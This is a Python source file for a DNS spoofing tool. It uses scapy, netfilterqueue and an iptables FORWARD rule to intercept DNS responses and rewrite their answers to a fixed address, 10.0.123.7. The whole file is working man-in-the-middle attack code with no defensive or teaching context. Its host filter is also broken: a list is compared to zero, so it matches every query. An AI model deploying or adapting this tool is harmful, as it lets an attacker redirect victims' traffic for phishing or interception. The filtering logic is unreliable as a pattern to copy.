import os
import re
from scapy.all import IP, DNSRR, DNS, UDP, DNSQR
from netfilterqueue import NetfilterQueue


class DnsSpoofer:
	def __init__(self, hosts):
		self.hosts = hosts
		self.queueNum = 65534
		self.queue = NetfilterQueue()

	def start(self):
		print("Spoofing....")
		os.system(
			f'iptables -I FORWARD -j NFQUEUE --queue-num {self.queueNum}')
		self.queue.bind(self.queueNum, self.callBack)
		try:
			self.queue.run()
		except KeyboardInterrupt:
			os.system(
				f'iptables -D FORWARD -j NFQUEUE --queue-num {self.queueNum}')
			print("[!] iptable rule flushed")

	def callBack(self, packet):
		scapyPacket = IP(packet.get_payload())
		if DNSRR in scapyPacket:
			try:
				print(f'[original] { scapyPacket[DNSRR].summary()}')
				queryName = scapyPacket[DNSQR].qname.decode()
				print(f'Query name: {queryName}')
				hostCheck = [i for i in self.hosts if re.search(i, queryName)]
				if hostCheck != 0:
					scapyPacket[DNS].an = DNSRR(
						rrname=queryName, rdata="10.0.123.7")
					scapyPacket[DNS].ancount = 1
					del scapyPacket[IP].len
					del scapyPacket[IP].chksum
					del scapyPacket[UDP].len
					del scapyPacket[UDP].chksum
					print(f'[modified] {scapyPacket[DNSRR].summary()}')
				else:
					print(f'[not modified] { scapyPacket[DNSRR].rdata }')					
			except IndexError as error:
				print(error)
			packet.set_payload(bytes(scapyPacket))
		return packet.accept()
